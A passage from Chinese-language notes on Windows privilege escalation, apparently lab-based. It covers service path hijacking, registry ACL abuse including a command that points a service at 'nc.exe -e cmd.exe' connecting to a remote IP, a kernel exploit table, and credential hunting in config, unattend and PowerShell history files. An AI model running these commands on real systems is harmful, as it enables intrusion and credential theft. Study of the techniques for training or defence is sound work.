class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure><p>如果可以创建以下文件，将能够劫持服务二进制文件并在服务上下文中获得命令执行，在本例中为<code>NT AUTHORITY\SYSTEM</code>。</p><ul><li><code>C:\Program.exe\</code></li><li><code>C:\Program Files (x86)\System.exe</code></li></ul><p>在驱动器根目录或程序文件文件夹中创建文件需要管理员权限。即使系统配置错误以允许这样做，用户也可能无法重新启动服务，并且需要依赖系统重新启动来提升权限。虽然发现服务路径未加引号的应用程序并不罕见，但通常很难被利用。</p><p>搜索未加引号的服务路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> |<span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>                                                                        <span class="title">GVFS.Service</span>                              <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                                                 <span class="title">Auto</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>                                                             <span class="title">SystemExplorerHelpService</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>             <span class="title">Auto</span></span></span><br><span class="line"><span class="function"><span class="title">WindscribeService</span>            </span></span><br></pre></td></tr></table></figure><h2 id="Permissive-Registry-ACLs"><a href="#Permissive-Registry-ACLs" class="headerlink" title="Permissive Registry ACLs"></a>Permissive Registry ACLs</h2><p>检查注册表中是否存在弱服务 ACL</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> &quot;<span class="title">mrb3n</span>&quot; -<span class="title">kvuqsw</span> <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">ModelManagerService</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br></pre></td></tr></table></figure><p>利用<code>Set-ItemProperty</code>来更改该<code>ImagePath</code>值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name &quot;ImagePath&quot; -Value &quot;C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443&quot;</span><br></pre></td></tr></table></figure><h2 id="Modifiable-Registry-Autorun-Binary"><a href="#Modifiable-Registry-Autorun-Binary" class="headerlink" title="Modifiable Registry Autorun Binary"></a>Modifiable Registry Autorun Binary</h2><p>使用 WMIC 查看系统启动时运行的程序。假设对给定二进制文件的注册表具有写权限，或者可以覆盖列出的二进制文件。在这种情况下，可能能够在用户下次登录时将权限提升给另一个用户。</p><p><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries">文章</a>和<a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2">网站</a>详细介绍了 Windows 系统上许多潜在的自动运行位置。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-CimInstance</span> Win32_StartupCommand | <span class="built_in">select</span> Name, command, Location, User |<span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">Name     : OneDrive</span><br><span class="line">command  : <span class="string">&quot;C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe&quot;</span> /background</span><br><span class="line">Location : HKU\S<span class="literal">-1-5-21-2374636737-2633833024-1808968233-1001</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : WINLPE<span class="literal">-WS01</span>\mrb3n</span><br><span class="line"></span><br><span class="line">Name     : Windscribe</span><br><span class="line">command  : <span class="string">&quot;C:\Program Files (x86)\Windscribe\Windscribe.exe&quot;</span> <span class="literal">-os_restart</span></span><br><span class="line">Location : HKU\S<span class="literal">-1-5-21-2374636737-2633833024-1808968233-1001</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : WINLPE<span class="literal">-WS01</span>\mrb3n</span><br><span class="line"></span><br><span class="line">Name     : SecurityHealth</span><br><span class="line">command  : %windir%\system32\SecurityHealthSystray.exe</span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br><span class="line"></span><br><span class="line">Name     : VMware User <span class="keyword">Process</span></span><br><span class="line">command  : <span class="string">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span> <span class="literal">-n</span> vmusr</span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br><span class="line"></span><br><span class="line">Name     : VMware VM3DService <span class="keyword">Process</span></span><br><span class="line">command  : <span class="string">&quot;C:\WINDOWS\system32\vm3dservice.exe&quot;</span> <span class="literal">-u</span></span><br><span class="line">Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">User     : Public</span><br></pre></td></tr></table></figure><hr><h1 id="Kernel-vulnerability"><a href="#Kernel-vulnerability" class="headerlink" title="Kernel vulnerability"></a>Kernel vulnerability</h1><p>此<a href="https://msrc.microsoft.com/update-guide/vulnerability">网站</a>便于搜索有关 Microsoft 安全漏洞的详细信息。</p><p>Windows 操作系统已知的远程代码执行&#x2F;本地特权提升漏洞的详细表格，按服务包级别细分，从 Windows XP 到 Server 2016。</p><table><thead><tr><th>Base OS</th><th>XP</th><th></th><th></th><th></th><th>2003</th><th></th><th></th><th>Vista</th><th></th><th></th><th>2008</th><th></th><th>7</th><th></th><th>2008R2</th><th></th><th>8</th><th>8.1</th><th>2012</th><th>2012R2</th><th>10</th><th>2016</th></tr></thead><tbody><tr><td>Service Pack</td><td>SP0</td><td>SP1</td><td>SP2</td><td>SP3</td><td>SP0</td><td>SP1</td><td>SP2</td><td>SP0</td><td>SP1</td><td>SP2</td><td>SP0</td><td>SP2</td><td>SP0</td><td>SP1</td><td>SP0</td><td>SP1</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS03-026</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS05-039</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS08-025</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS08-067</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS08-068</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS09-012</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS09-050</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS10-015</td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS10-059</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS10-092</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS11-011</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS11-046</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS11-062</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS11-080</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS13-005</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td></tr><tr><td>MS13-053</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td></tr><tr><td>MS13-081</td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td></td><td></td><td></td></tr><tr><td>MS14-002</td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS14-040</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS14-058</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS14-062</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS14-068</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS14-070</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS15-001</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-010</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-051</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-061</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-076</td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-078</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS15-097</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td></tr><tr><td>MS16-016</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>MS16-032</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td>•</td><td>•</td><td></td><td></td></tr><tr><td>MS16-135</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td></tr><tr><td>MS17-010</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td></tr><tr><td>CVE-2017-0213: COM Aggregate Marshaler</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td></tr><tr><td>Hot Potato</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td></tr><tr><td>SmashedPotato</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td>•</td><td></td></tr></tbody></table><hr><h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><p>在评估过程中，通常会在 Windows 工作站上遇到大量不同的应用程序和服务。</p><p>枚举已安装的应用程序</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">product</span> <span class="title">get</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Name</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.28.29910</span></span><br><span class="line"><span class="function"><span class="title">Update</span> <span class="title">for</span> <span class="title">Windows</span> 10 <span class="title">for</span> <span class="title">x64</span>-<span class="title">based</span> <span class="title">Systems</span> (<span class="title">KB4023057</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">VMware</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Druva</span> <span class="title">inSync</span> 6.6.3</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Update</span> <span class="title">Health</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.28.29910</span></span><br><span class="line"><span class="function"><span class="title">Update</span> <span class="title">for</span> <span class="title">Windows</span> 10 <span class="title">for</span> <span class="title">x64</span>-<span class="title">based</span> <span class="title">Systems</span> (<span class="title">KB4480730</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br></pre></td></tr></table></figure><p>找到输出的应用程序，搜索漏洞，并尽可能的利用。</p><hr><h1 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h1><p><code>DLL injection</code>是一种将一段代码（结构化为动态链接库 (DLL)）插入正在运行的进程的方法。此技术允许插入的代码在进程的上下文中运行，从而影响其行为或访问其资源。</p><p><code>DLL injection</code>将恶意代码插入受信任的进程，在逃避安全软件检测方面特别有效。</p><p>待办</p><hr><h1 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h1><h2 id="Find-File"><a href="#Find-File" class="headerlink" title="Find File"></a>Find File</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; findstr /SIM /C:<span class="string">&quot;password&quot;</span> *.txt *.ini *.cfg *.config *.xml</span><br></pre></td></tr></table></figure><h3 id="词典文件"><a href="#词典文件" class="headerlink" title="词典文件"></a>词典文件</h3><p>Chrome 词典文件，密码等敏感信息可能会被输入到电子邮件客户端或基于浏览器的应用程序中，这些应用程序会用下划线标记无法识别的任何单词。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> <span class="string">&#x27;C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt&#x27;</span> | <span class="built_in">Select-String</span> password</span><br><span class="line"></span><br><span class="line">Password1234!</span><br></pre></td></tr></table></figure><h3 id="无人值守安装的文件"><a href="#无人值守安装的文件" class="headerlink" title="无人值守安装的文件"></a>无人值守安装的文件</h3><p>无人值守安装文件可能会定义自动登录设置或作为安装的一部分要创建的附加帐户。其中的密码以纯文本或 base64 编码形式存储。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">unattend</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:unattend&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span> <span class="attr">pass</span>=<span class="string">&quot;specialize&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span> <span class="attr">publicKeyToken</span>=<span class="string">&quot;31bf3856ad364e35&quot;</span> <span class="attr">language</span>=<span class="string">&quot;neutral&quot;</span> <span class="attr">versionScope</span>=<span class="string">&quot;nonSxS&quot;</span> <span class="attr">xmlns:wcm</span>=<span class="string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AutoLogon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Password</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Value</span>&gt;</span>local_4dmin_p@ss<span class="tag">&lt;/<span class="name">Value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">PlainText</span>&gt;</span>true<span class="tag">&lt;/<span class="name">PlainText</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">Password</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Enabled</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">LogonCount</span>&gt;</span>2<span class="tag">&lt;/<span class="name">LogonCount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Username</span>&gt;</span>Administrator<span class="tag">&lt;/<span class="name">Username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">AutoLogon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ComputerName</span>&gt;</span>*<span class="tag">&lt;/<span class="name">ComputerName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><h3 id="PowerShell-历史文件"><a href="#PowerShell-历史文件" class="headerlink" title="PowerShell 历史文件"></a>PowerShell 历史文件</h3><p>从 Windows 10 中的 Powershell 5.0 开始，PowerShell 将命令历史记录存储到文件中：<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p><p>查询 PowerShell 历史记录保存路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br><span class="line"></span><br><span class="line">C:\Users\htb<span class="literal">-student</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p>读取 PowerShell 历史文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> (<span class="built_in">Get-PSReadLineOption</span>).HistorySavePath</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cd</span> Temp</span><br><span class="line"><span class="built_in">md</span> backups</span><br><span class="line"><span class="built_in">cp</span> c:\inetpub\wwwroot\* .\backups\</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="operator">-bor</span> <span class="number">3072</span>; <span class="built_in">iex</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1&#x27;</span>))</span><br><span class="line">. .\<span class="built_in">Get-IISsite</span>.ps1</span><br><span class="line"><span class="built_in">Get-IISsite</span> <span class="literal">-Server</span> WEB02 <span class="literal">-web</span> <span class="string">&quot;Default Web Site&quot;</span></span><br><span class="line">wevtutil qe Application <span class="string">&quot;/q:*[Application [(EventID=3005)]]&quot;</span> /f:text /<span class="built_in">rd</span>:true /u:WEB02\administrator /p:<span class="number">5</span>erv3rAdmin! /<span class="built_in">r</span>:WEB02</span><br></pre></td></tr></table></figure><p>检索当前用户能够访问的所有 Powershell 历史文件的内容。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="keyword">foreach</span>(<span class="variable">$user</span> <span class="keyword">in</span> ((<span class="built_in">ls</span> C:\users).fullname))&#123;<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$user</span>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cd</span> Temp</span><br><span class="line"><span class="built_in">md</span> backups</span><br><span class="line"><span class="built_in">cp</span> c:\inetpub\wwwroot\* .\backups\</span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="operator">-bor</span> <span class="number">3072</span>; <span class="built_in">iex</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">&#x27;https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1&#x27;</span>))</span><br><span class="line">. .\<span class="built_in">Get-IISsite</span>.ps1</span><br><span class="line"><span class="built_in">Get-IISsite</span> <span class="literal">-Server</span> WEB02 <span class="literal">-web</span> <span 